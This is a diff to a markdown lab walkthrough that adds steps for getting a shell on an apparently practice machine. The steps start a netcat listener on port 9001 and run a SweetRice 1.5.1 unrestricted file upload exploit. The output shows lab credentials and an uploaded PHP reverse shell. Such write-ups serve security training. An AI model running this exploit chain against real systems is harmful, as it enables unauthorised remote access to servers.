@@ -135,4 +135,33 @@ $port = 9001;       // CHANGE THIS
 ...
 ```
 
+15. Now open another terminal and start listing to port ```9001``` before uploading the php script.
+```bash
+nc -lvnp 9001
+```
 
+16. Run the python script exploit and click on the links to gain shell access.
+```bash
++-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
+|  _________                      __ __________.__                  |
+| /   _____/_  _  __ ____   _____/  |\______   \__| ____  ____      |
+| \_____  \ \/ \/ // __ \_/ __ \   __\       _/  |/ ___\/ __ \     |
+| /        \     /\  ___/\  ___/|  | |    |   \  \  \__\  ___/     |
+|/_______  / \/\_/  \___  >\___  >__| |____|_  /__|\___  >___  >    |
+|        \/             \/     \/            \/        \/    \/     |                                                    
+|    > SweetRice 1.5.1 Unrestricted File Upload                     |
+|    > Script Cod3r : Ehsan Hosseini                                |
++-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
+
+Enter The Target URL(Example : localhost.com) : 10.10.131.164/content
+Enter Username : manager
+Enter Password : Password123
+Enter FileName (Example:.htaccess,shell.php5,index.html) : reshell.php5
+[+] Sending User&Pass...
+[+] Login Succssfully...
+[+] File Uploaded...
+[+] URL : http://10.10.131.164/content/attachment/reshell.php5
+root@kali:~# 
+```
+
+## Gaining a Stable Shell
